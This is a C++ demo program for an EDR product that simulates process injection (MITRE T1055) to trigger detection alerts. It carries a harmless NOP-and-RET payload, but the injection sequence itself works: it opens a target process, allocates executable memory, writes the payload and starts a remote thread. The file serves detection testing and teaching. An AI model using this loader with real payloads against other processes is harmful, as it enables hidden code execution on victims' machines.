// injection_demo.cpp
// SentinelLite-EDR — Process Injection 攻擊模擬器
// MITRE ATT&CK T1055：Process Injection
//
// 執行方式：injection_demo.exe <target_pid>
// 範例：   injection_demo.exe 18356
//
// !! 僅供教育與 Demo 用途 !!

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// 無害 payload：NOP sled + RET，執行後立即返回
static const BYTE g_payload[] = {
    0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,
    0xC3  // RET
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:   injection_demo.exe <target_pid>\n");
        printf("Example: injection_demo.exe 18356\n");
        return 1;
    }

    DWORD targetPid = static_cast<DWORD>(atoi(argv[1]));

    printf("====================================================\n");
    printf(" SentinelLite-EDR — Attack Simulator\n");
    printf(" MITRE ATT&CK T1055: Process Injection\n");
    printf("====================================================\n");
    printf("[*] Target PID: %lu\n\n", targetPid);

    // Step 1: OpenProcess
    printf("[1/4] OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE\n");
    printf("                  | PROCESS_CREATE_THREAD, PID=%lu)...", targetPid);

    HANDLE hProcess = ::OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE,
        targetPid
    );
    if (!hProcess) {
        printf(" FAILED (error=%lu)\n", ::GetLastError());
        printf("[!] 請以 Administrator 執行，並確認目標 PID 正確\n");
        return 1;
    }
    printf(" OK (handle=0x%p)\n", hProcess);

    // Step 2: VirtualAllocEx — 觸發 EDR 的第一個 CRITICAL
    printf("[2/4] VirtualAllocEx(PAGE_EXECUTE_READWRITE, size=%zu)...",
        sizeof(g_payload));

    LPVOID pRemote = ::VirtualAllocEx(
        hProcess,
        nullptr,
        sizeof(g_payload),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // ← EDR 偵測的關鍵 flag
    );
    if (!pRemote) {
        printf(" FAILED (error=%lu)\n", ::GetLastError());
        ::CloseHandle(hProcess);
        return 1;
    }
    printf(" OK (remote_addr=0x%p)\n", pRemote);

    // Step 3: WriteProcessMemory
    printf("[3/4] WriteProcessMemory(payload_size=%zu)...", sizeof(g_payload));

    SIZE_T written = 0;
    if (!::WriteProcessMemory(hProcess, pRemote,
        g_payload, sizeof(g_payload), &written)
        || written != sizeof(g_payload))
    {
        printf(" FAILED (error=%lu)\n", ::GetLastError());
        ::VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        ::CloseHandle(hProcess);
        return 1;
    }
    printf(" OK (%zu bytes written)\n", written);

    // Step 4: CreateRemoteThread — 觸發 EDR 的第二個 CRITICAL
    printf("[4/4] CreateRemoteThread(start=0x%p)...", pRemote);

    HANDLE hThread = ::CreateRemoteThread(
        hProcess,
        nullptr,
        0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(pRemote),
        nullptr,
        0,
        nullptr
    );
    if (!hThread) {
        printf(" FAILED (error=%lu)\n", ::GetLastError());
        ::VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        ::CloseHandle(hProcess);
        return 1;
    }
    printf(" OK (thread=0x%p)\n\n", hThread);

    ::WaitForSingleObject(hThread, 3000);

    // 清理
    ::CloseHandle(hThread);
    ::VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    ::CloseHandle(hProcess);

    printf("[*] Injection sequence complete.\n");
    printf("[*] Switch to ControllerEXE window to see CRITICAL alerts.\n");
    return 0;
}